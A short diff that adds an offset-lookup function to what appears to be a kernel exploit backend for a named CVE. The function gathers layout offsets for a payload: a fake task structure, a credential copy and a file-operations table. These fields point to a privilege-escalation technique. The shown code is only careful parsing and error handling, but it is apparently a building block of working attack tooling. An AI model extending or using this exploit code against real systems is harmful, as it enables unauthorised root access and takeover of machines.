@@ -52,4 +52,34 @@ namespace ghostlock::backend::cve_2026_43499 {
         out = staged;
         return result;
     }
+    OffsetLookup fill_payload_offsets(const memory::KeyView &view, PayloadOffsets &out) noexcept {
+        /* The same shape as the task offsets, for the same reason: everything is read into a
+         *  local first, so the caller is only touched once all five have been read and a half
+         *  layout can never be used by mistake. */
+        PayloadOffsets staged{};
+        OffsetLookup result = take(view, kPayloadFields[0U], staged.lock_offset);
+        if (result.verdict != AbiVerdict::Ok) {
+            return result;
+        }
+        result = take(view, kPayloadFields[1U], staged.waiter_w0_offset);
+        if (result.verdict != AbiVerdict::Ok) {
+            return result;
+        }
+        result = take(view, kPayloadFields[2U], staged.fake_task_offset);
+        if (result.verdict != AbiVerdict::Ok) {
+            return result;
+        }
+        result = take(view, kPayloadFields[3U], staged.cred_copy_offset);
+        if (result.verdict != AbiVerdict::Ok) {
+            return result;
+        }
+        result = take(view, kPayloadFields[4U], staged.fops_table_offset);
+        if (result.verdict != AbiVerdict::Ok) {
+            return result;
+        }
+        out = staged;
+        result.verdict = AbiVerdict::Ok;
+        result.field = nullptr;
+        return result;
+    }
 }  // namespace ghostlock::backend::cve_2026_43499
